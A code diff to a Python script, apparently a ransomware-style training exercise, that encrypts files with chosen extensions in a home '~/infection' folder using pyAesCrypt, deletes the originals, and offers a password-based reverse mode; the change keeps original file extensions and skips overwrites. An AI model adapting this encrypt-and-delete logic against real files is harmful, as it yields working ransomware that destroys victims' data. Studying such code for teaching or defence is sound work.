@@ -30,12 +30,16 @@ if __name__ == "__main__":
 
         for file in files:
             file = home + "/infection/" + file
+            ext = ".ft"
             if (args.r):
-                if os.path.splitext(file)[1] == ".ft":
+                if os.path.splitext(file)[1] == ext:
                     try:
-                        pyAesCrypt.decryptFile(file, os.path.splitext(file)[0] + ".txt", args.password)
-                        os.remove(file)
-                        print(f"{file} {p_green}decrypted ->{p_reset} {os.path.splitext(file)[0] + '.txt'}") if args.s == False else None
+                        if os.path.exists(os.path.splitext(file)[0]) :
+                            print(f"WARNING: can't decrypt {file} because {os.path.splitext(file)[0]} exists") if args.s == False else None
+                        else :
+                            pyAesCrypt.decryptFile(file, os.path.splitext(file)[0], args.password)
+                            os.remove(file)
+                            print(f"{file} {p_green}decrypted ->{p_reset} {os.path.splitext(file)[0]}") if args.s == False else None
                     except ValueError:
                         print(f"Wrong password") if args.s == False else None
                     except:
@@ -43,9 +47,12 @@ if __name__ == "__main__":
             else:
                 if os.path.splitext(file)[1] in extensions:
                     try:
-                        pyAesCrypt.encryptFile(file, os.path.splitext(file)[0] + ".ft", args.password)
-                        os.remove(file)
-                        print(f"{file} {p_red}encrypted ->{p_reset} {os.path.splitext(file)[0] + '.ft'}") if args.s == False else None
+                        if os.path.exists(file + ext) :
+                            print(f"WARNING: can't encrypt {file} because {file + ext} exists") if args.s == False else None
+                        else :
+                            pyAesCrypt.encryptFile(file, file + ext, args.password)
+                            os.remove(file)
+                            print(f"{file} {p_red}encrypted ->{p_reset} {file + ext}") if args.s == False else None
                     except:
                         print(f"can't encrypt file {file}") if args.s == False else None
     except FileNotFoundError:
